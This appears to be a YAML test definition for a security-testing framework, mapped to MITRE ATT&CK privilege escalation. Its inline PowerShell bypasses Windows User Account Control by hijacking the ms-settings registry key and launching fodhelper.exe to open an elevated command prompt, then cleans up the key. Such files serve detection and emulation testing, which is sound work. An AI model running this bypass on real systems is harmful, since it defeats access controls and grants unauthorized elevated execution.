api_version: "2.0"
name: Bypass UAC using Fodhelper - PowerShell
description: |
    PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
    Upon execution command prompt will be opened.
args:
    - name: executable_binary
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: 3f627297-6c38-4e7d-a278-fc2563eaaeaa
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1548: Abuse Elevation Control Mechanism'
    subtechniques:
        - 'T1548.002: Bypass User Account Control'
requirements:
    platforms:
        - os: windows
steps:
    - name: bypass-uac-using-fodhelper---powershell
      inline: |
        New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
        New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "{{.Args.executable_binary}}" -Force
        Start-Process "C:\Windows\System32\fodhelper.exe"
      executor: powershell
      cleanup:
        inline: |
            Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
        executor: powershell
